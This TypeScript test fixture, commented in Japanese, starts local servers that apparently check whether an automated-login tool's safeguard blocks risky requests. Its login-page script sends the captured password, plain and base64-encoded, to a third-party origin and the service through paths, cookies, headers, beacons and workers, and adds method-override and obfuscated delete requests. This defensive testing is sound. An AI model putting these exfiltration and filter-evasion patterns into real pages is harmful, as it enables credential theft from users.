// SFIX-1104（SREV-1104 の C-1・I-2）: 自動ログインの段の通し方（DEF-193）を崩す要求を、ログインの後にページが送るサイトの fixture。3 つの Origin（アプリ・サービス・
// 第三者）。レビューの 30 種の場面に、読まないパス（`LOGIN_PROBE_EXCLUDED_PATH`）への自動の POST を足した。資格情報を含んで届いたか（そのまま・base64・Basic）は、
// サーバの記録（`carriesCredential`）で数える（値は記録しない）。
// SFIX-1104-2（SREV-1104-2 の C1・C2）: base64 に `+`・`/` が出る記号つきのパスワード（`passwordKind: 'symbol'`）と、レビューの `x_` の場面（Basic の
// 書き方の違い・base64 の JSON・`encodeURIComponent` した query・`X-` のヘッダ・ID だけの base64）を足した。ID だけを含んだか（`carriesUsername`）は別に数える
// （読み取りの要求の ID は比べない決まり。SREV-1104-2 の M1）。
import type { IncomingMessage, RequestListener } from 'node:http';
import { randomBytes } from 'node:crypto';
import { startLoopbackHttpServer } from './loopback-server.js';

/** 読まないパス（認証の設定の `excludedPaths` に入れる）。 */
export const LOGIN_PROBE_EXCLUDED_PATH = '/probe/private';

export interface LoginProbeRecord {
  readonly origin: 'svc' | 'third';
  readonly method: string;
  readonly path: string;
  readonly search: string;
  readonly preflight: boolean;
  /** パスワード、または「ID:パスワード」を含んだか（そのまま・`%XX` を戻した形・base64 の 4 通り・Basic を解いた形）。 */
  readonly carriesCredential: boolean;
  /** SFIX-1104-2: ID を含んだか（そのまま・`%XX` を戻した形・base64 の 4 通り・Basic を解いた形）。 */
  readonly carriesUsername: boolean;
}

/** SFIX-1104-2: パスワードの種類（`hex` は 16 進だけ。`symbol` は base64 に `+`・`/` が出る記号つき）。 */
export type LoginProbePasswordKind = 'hex' | 'symbol';

export interface LoginProbeSite {
  readonly appOrigin: string;
  readonly svcOrigin: string;
  readonly thirdOrigin: string;
  readonly username: string;
  readonly password: string;
  readonly records: LoginProbeRecord[];
  close(): Promise<void>;
}

const readBody = async (request: IncomingMessage): Promise<Buffer> => {
  const chunks: Buffer[] = [];
  for await (const chunk of request) chunks.push(chunk as Buffer);
  return Buffer.concat(chunks);
};

const base64Of = (text: string): string => Buffer.from(text).toString('base64');
/** 標準・パディングなし・URL 用（パディングなし）・URL 用（パディングつき）の 4 通り。 */
const base64FormsOf = (text: string): readonly string[] => {
  const standard = base64Of(text);
  const unpadded = standard.replace(/=+$/u, '');
  const urlSafe = (value: string): string => value.replace(/\+/gu, '-').replace(/\//gu, '_');
  return [standard, unpadded, urlSafe(unpadded), urlSafe(standard)];
};
/** ヘッダの `Basic` の値を解いた文字列（標準と URL 用）。 */
const decodedBasicTextsOf = (headers: IncomingMessage['headers']): string => Object.values(headers).flat()
  .filter((value): value is string => typeof value === 'string')
  .map((value) => /^\s*basic\s+(\S+)/iu.exec(value)?.[1])
  .filter((value): value is string => value !== undefined)
  .map((value) => Buffer.from(value.replace(/-/gu, '+').replace(/_/gu, '/'), 'base64').toString('utf8'))
  .join('\n');

/** パスワードの種類に合う値を作る（`symbol` は、パスワードの base64 に `+` と `/` が、「ID:パスワード」の base64 に `+` か `/` が出るまで作り直す）。 */
const passwordOf = (kind: LoginProbePasswordKind, username: string): string => {
  if (kind === 'hex') {
    return `P${randomBytes(8).toString('hex')}`;
  }
  const alphabet = 'abcdef0123456789~?';
  for (;;) {
    const password = `P${Array.from(randomBytes(15), (byte) => alphabet[byte % alphabet.length]).join('')}`;
    const own = base64Of(password);
    const pair = base64Of(`${username}:${password}`);
    if (own.includes('+') && own.includes('/') && (pair.includes('+') || pair.includes('/'))) {
      return password;
    }
  }
};

export async function startLoginProbeSite(options: { readonly passwordKind?: LoginProbePasswordKind } = {}): Promise<LoginProbeSite> {
  const username = `u${randomBytes(5).toString('hex')}@example.test`;
  const password = passwordOf(options.passwordKind ?? 'hex', username);
  const credentialForms = [password, ...base64FormsOf(password), ...base64FormsOf(`${username}:${password}`)];
  const usernameForms = [username, ...base64FormsOf(username)];
  const records: LoginProbeRecord[] = [];
  let appOrigin = '';
  const cors = (): Record<string, string> => ({
    'access-control-allow-origin': appOrigin,
    'access-control-allow-credentials': 'true',
    vary: 'Origin',
    'access-control-allow-headers': 'content-type, apikey, authorization, x-debug, x-auth, x-http-method-override, x-http-method, x-method-override',
    'access-control-allow-methods': 'GET, POST, DELETE, PATCH, PUT',
  });
  const listenerOf = (origin: 'svc' | 'third'): RequestListener => (request, response) => {
    void (async (): Promise<void> => {
      const url = new URL(request.url ?? '/', 'http://x');
      const method = request.method ?? 'GET';
      const preflight = method === 'OPTIONS';
      const body = preflight ? Buffer.alloc(0) : await readBody(request);
      let decodedPath = url.pathname + url.search;
      try { decodedPath = decodeURIComponent(decodedPath); } catch { /* そのまま */ }
      const all = `${decodedPath}\n${url.pathname}${url.search}\n${body.toString('utf8')}${JSON.stringify(request.headers)}${decodedBasicTextsOf(request.headers)}`;
      const carriesCredential = credentialForms.some((form) => all.includes(form));
      const carriesUsername = usernameForms.some((form) => all.includes(form));
      records.push({ origin, method, path: url.pathname, search: url.search, preflight, carriesCredential, carriesUsername });
      const headers = { 'content-type': 'application/json', ...cors() };
      if (preflight) { response.writeHead(204, headers); response.end(); return; }
      if (origin === 'svc' && url.pathname === '/auth/v1/token' && method === 'POST' && url.search === '?grant_type=password') {
        let parsed: Record<string, unknown> = {};
        try { parsed = JSON.parse(body.toString('utf8')) as Record<string, unknown>; } catch { /* 誤り */ }
        if (parsed['email'] === username && parsed['password'] === password) {
          response.writeHead(200, headers);
          response.end(JSON.stringify({ access_token: `a${randomBytes(6).toString('hex')}`, refresh_token: `r${randomBytes(6).toString('hex')}` }));
          return;
        }
        response.writeHead(400, headers); response.end('{}'); return;
      }
      response.writeHead(200, headers);
      response.end(JSON.stringify({ ok: true, access_token: 'a2', refresh_token: 'r2' }));
    })();
  };
  const authHtml = '<!doctype html><html lang="ja"><head><meta charset="utf-8"><title>ログイン</title><link rel="icon" href="data:,">'
    + '<script src="/app.js" defer></script></head><body><main><h1>ログイン</h1><form id="f"><label>メール <input id="email" name="email"></label>'
    + '<label>パスワード <input id="password" name="password" type="password"></label><button id="submit" type="submit">ログイン</button></form>'
    + '<p id="state" data-state="idle"></p></main></body></html>';
  let svcOrigin = '';
  let thirdOrigin = '';
  const workerJs = `self.onmessage = async (e) => { const { url, pw } = e.data; let s = 0; try { s = (await fetch(url, { method: 'POST', body: JSON.stringify({ n: pw }) })).status; } catch {} self.postMessage(s); };`;
  const appJs = (): string => `'use strict';
const S = ${JSON.stringify(svcOrigin)};
const T = ${JSON.stringify(thirdOrigin)};
const J = { 'content-type': 'application/json', apikey: 'k1' };
const send = (url, init) => fetch(url, init).then((r) => r.status).catch(() => 0);
document.getElementById('f').addEventListener('submit', async (event) => {
  event.preventDefault();
  const email = document.getElementById('email').value;
  const pw = document.getElementById('password').value;
  const r = await fetch(S + '/auth/v1/token?grant_type=password', { method: 'POST', headers: J, body: JSON.stringify({ email, password: pw }) }).catch(() => null);
  if (r === null || !r.ok) { document.getElementById('state').dataset.state = 'login-failed'; return; }
  const results = {};
  const run = async (name, url, init) => { results[name] = await send(url, init); };
  await run('ok', S + '/probe/ok', { method: 'POST', headers: J, body: '{}' });
  await run('credPath', S + '/probe/credPath/' + encodeURIComponent(pw), { method: 'POST', headers: J, body: '{}' });
  document.cookie = 'dbg=' + pw + '; path=/';
  await run('credCookie', S + '/probe/credCookie', { method: 'POST', headers: J, body: '{}', credentials: 'include' });
  document.cookie = 'dbg=; max-age=0; path=/';
  await run('credB64Body', S + '/probe/credB64Body', { method: 'POST', headers: J, body: JSON.stringify({ d: btoa(pw) }) });
  await run('credBasic', S + '/probe/credBasic', { method: 'POST', headers: { ...J, authorization: 'Basic ' + btoa(email + ':' + pw) }, body: '{}' });
  await run('credBasicGet', S + '/probe/credBasicGet', { method: 'GET', headers: { apikey: 'k1', authorization: 'Basic ' + btoa(email + ':' + pw) } });
  await run('credThird', T + '/probe/credThird', { method: 'POST', headers: J, body: JSON.stringify({ n: pw }) });
  await run('thirdNoCred', T + '/probe/thirdNoCred', { method: 'POST', headers: J, body: '{}' });
  results.credBeaconQueued = navigator.sendBeacon(S + '/probe/credBeacon', 'n=' + pw) ? 1 : 0;
  await run('credBlob', S + '/probe/credBlob', { method: 'POST', body: new Blob(['{"n":"' + pw + '"}'], { type: 'text/plain' }) });
  const fd = new FormData(); fd.append('n', pw);
  await run('credForm', S + '/probe/credForm', { method: 'POST', body: fd });
  await run('credBig', S + '/probe/credBig', { method: 'POST', headers: { 'content-type': 'text/plain' }, body: 'x'.repeat(3 * 1024 * 1024) + pw });
  results.credWorker = await new Promise((resolve) => { try { const w = new Worker('/worker.js'); w.onmessage = (e) => resolve(e.data); w.onerror = () => resolve(-1); w.postMessage({ url: S + '/probe/credWorker', pw }); setTimeout(() => resolve(-2), 5000); } catch { resolve(-3); } });
  await run('refreshCred', S + '/auth/v1/token?grant_type=refresh_token', { method: 'POST', headers: J, body: JSON.stringify({ refresh_token: 'r', password: pw }) });
  await run('secondLoginQ', S + '/auth/v1/token?grant_type=password&x=1', { method: 'POST', headers: J, body: JSON.stringify({ email, password: pw }) });
  await run('secondLoginBasic', S + '/auth/v1/token?grant_type=password&x=2', { method: 'POST', headers: { ...J, authorization: 'Basic ' + btoa(email + ':' + pw) }, body: '{}' });
  await run('overrideForm', S + '/probe/overrideForm', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: '_method=DELETE&id=1' });
  const fd2 = new FormData(); fd2.append('_method', 'DELETE');
  await run('overrideMultipart', S + '/probe/overrideMultipart', { method: 'POST', body: fd2 });
  await run('overrideJson', S + '/probe/overrideJson', { method: 'POST', headers: J, body: JSON.stringify({ _method: 'DELETE', id: 1 }) });
  await run('overrideQuery', S + '/probe/overrideQuery?_method=DELETE', { method: 'POST', headers: J, body: '{}' });
  await run('overrideXHM', S + '/probe/overrideXHM', { method: 'POST', headers: { ...J, 'x-http-method': 'delete' }, body: '{}' });
  await run('overrideXMO', S + '/probe/overrideXMO', { method: 'POST', headers: { ...J, 'x-method-override': 'GET, DELETE' }, body: '{}' });
  await run('putMethod', S + '/probe/putMethod', { method: 'PUT', headers: J, body: '{}' });
  await run('patchMethod', S + '/probe/patchMethod?id=eq.1', { method: 'PATCH', headers: J, body: '{}' });
  await run('dangerQueryEnc', S + '/probe/dangerQueryEnc?op=%64elete', { method: 'POST', headers: J, body: '{}' });
  await run('dangerFullwidth', S + '/probe/\\uFF44\\uFF45\\uFF4C\\uFF45\\uFF54\\uFF45', { method: 'POST', headers: J, body: '{}' });
  await run('dangerPathEnc', S + '/probe/%64elete_item', { method: 'POST', headers: J, body: '{}' });
  await run('dangerLogout', S + '/probe/logout', { method: 'POST', headers: J, body: '{}' });
  await run('excludedPath', S + '/probe/private/sync', { method: 'POST', headers: J, body: '{}' });
  await run('refresh1', S + '/auth/v1/token?grant_type=refresh_token', { method: 'POST', headers: J, body: JSON.stringify({ refresh_token: 'r' }) });
  await run('refresh2', S + '/auth/v1/token?grant_type=refresh_token', { method: 'POST', headers: J, body: JSON.stringify({ refresh_token: 'r2' }) });
  // SFIX-1104-2: レビュー（SREV-1104-2）の x_ の場面。
  const B = (t) => btoa(t);
  const US = (t) => btoa(t).replace(/=+$/, '').replace(/\\+/g, '-').replace(/\\//g, '_');
  const AK = { apikey: 'k1' };
  await run('x_basicLower', S + '/probe/x_basicLower', { method: 'POST', headers: { ...J, authorization: 'basic ' + B(email + ':' + pw) }, body: '{}' });
  await run('x_basicUpper', S + '/probe/x_basicUpper', { method: 'POST', headers: { ...J, authorization: 'BASIC ' + B(email + ':' + pw) }, body: '{}' });
  await run('x_basicTwoSpaces', S + '/probe/x_basicTwoSpaces', { method: 'POST', headers: { ...J, authorization: 'Basic  ' + B(email + ':' + pw) }, body: '{}' });
  await run('x_basicLowerGet', S + '/probe/x_basicLowerGet', { method: 'GET', headers: { ...AK, authorization: 'basic ' + B(email + ':' + pw) } });
  await run('x_basicUpperTwoGet', S + '/probe/x_basicUpperTwoGet', { method: 'GET', headers: { ...AK, authorization: 'BASIC  ' + B(email + ':' + pw) } });
  await run('x_basicUrlSafeGet', S + '/probe/x_basicUrlSafeGet', { method: 'GET', headers: { ...AK, authorization: 'Basic ' + US(email + ':' + pw) } });
  await run('x_basicIdOnlyPost', S + '/probe/x_basicIdOnlyPost', { method: 'POST', headers: { ...J, authorization: 'Basic ' + B(email) }, body: '{}' });
  await run('x_basicIdColonPost', S + '/probe/x_basicIdColonPost', { method: 'POST', headers: { ...J, authorization: 'Basic ' + B(email + ':') }, body: '{}' });
  await run('x_basicIdOnlyGet', S + '/probe/x_basicIdOnlyGet', { method: 'GET', headers: { ...AK, authorization: 'Basic ' + B(email) } });
  await run('x_basicPwOnlyPost', S + '/probe/x_basicPwOnlyPost', { method: 'POST', headers: { ...J, authorization: 'Basic ' + B(pw) }, body: '{}' });
  await run('x_basicPwOnlyGet', S + '/probe/x_basicPwOnlyGet', { method: 'GET', headers: { ...AK, authorization: 'Basic ' + B(pw) } });
  await run('x_basicColonPwGet', S + '/probe/x_basicColonPwGet', { method: 'GET', headers: { ...AK, authorization: 'Basic ' + B(':' + pw) } });
  await run('x_b64JsonNested', S + '/probe/x_b64JsonNested', { method: 'POST', headers: J, body: JSON.stringify({ a: { b: [B(pw)] } }) });
  await run('x_b64JsonUrlSafe', S + '/probe/x_b64JsonUrlSafe', { method: 'POST', headers: J, body: JSON.stringify({ d: US(pw) }) });
  await run('x_b64JsonBasic', S + '/probe/x_b64JsonBasic', { method: 'POST', headers: J, body: JSON.stringify({ d: B(email + ':' + pw) }) });
  await run('x_b64QueryGetEnc', S + '/probe/x_b64QueryGetEnc?d=' + encodeURIComponent(B(pw)), { method: 'GET', headers: AK });
  await run('x_b64QueryGetRaw', S + '/probe/x_b64QueryGetRaw?d=' + B(pw), { method: 'GET', headers: AK });
  await run('x_b64QueryGetUrlSafe', S + '/probe/x_b64QueryGetUrlSafe?d=' + US(pw), { method: 'GET', headers: AK });
  await run('x_b64QueryGetBasicEnc', S + '/probe/x_b64QueryGetBasicEnc?d=' + encodeURIComponent(B(email + ':' + pw)), { method: 'GET', headers: AK });
  await run('x_b64QueryGetSimple', S + '/probe/x_b64QueryGetSimple?d=' + encodeURIComponent(B(pw)));
  await run('x_b64QueryPostEnc', S + '/probe/x_b64QueryPostEnc?d=' + encodeURIComponent(B(pw)), { method: 'POST', headers: J, body: '{}' });
  await run('x_xHeaderPw', S + '/probe/x_xHeaderPw', { method: 'POST', headers: { ...J, 'x-debug': B(pw) }, body: '{}' });
  await run('x_xHeaderPwGet', S + '/probe/x_xHeaderPwGet', { method: 'GET', headers: { ...AK, 'x-debug': B(pw) } });
  await run('x_xHeaderBasic', S + '/probe/x_xHeaderBasic', { method: 'POST', headers: { ...J, 'x-auth': 'Basic ' + B(email + ':' + pw) }, body: '{}' });
  await run('x_xHeaderBasicGet', S + '/probe/x_xHeaderBasicGet', { method: 'GET', headers: { ...AK, 'x-auth': 'basic ' + B(email + ':' + pw) } });
  await run('x_xHeaderId', S + '/probe/x_xHeaderId', { method: 'POST', headers: { ...J, 'x-debug': B(email) }, body: '{}' });
  document.getElementById('state').dataset.results = JSON.stringify(results);
  document.getElementById('state').dataset.state = 'done';
});
`;
  const app: RequestListener = (request, response) => {
    const url = new URL(request.url ?? '/', 'http://x');
    const send = (status: number, type: string, body: string): void => {
      response.writeHead(status, { 'content-type': type, 'cache-control': 'no-store' });
      response.end(body);
    };
    if (url.pathname === '/auth') { send(200, 'text/html; charset=utf-8', authHtml); return; }
    if (url.pathname === '/app.js') { send(200, 'text/javascript; charset=utf-8', appJs()); return; }
    if (url.pathname === '/worker.js') { send(200, 'text/javascript; charset=utf-8', workerJs); return; }
    send(404, 'text/plain', '');
  };
  const appServer = await startLoopbackHttpServer(app);
  const svcServer = await startLoopbackHttpServer(listenerOf('svc'));
  const thirdServer = await startLoopbackHttpServer(listenerOf('third'));
  appOrigin = appServer.origin;
  svcOrigin = svcServer.origin;
  thirdOrigin = thirdServer.origin;
  return {
    appOrigin, svcOrigin, thirdOrigin, username, password, records,
    close: async () => { await Promise.all([appServer.close(), svcServer.close(), thirdServer.close()]); },
  };
}
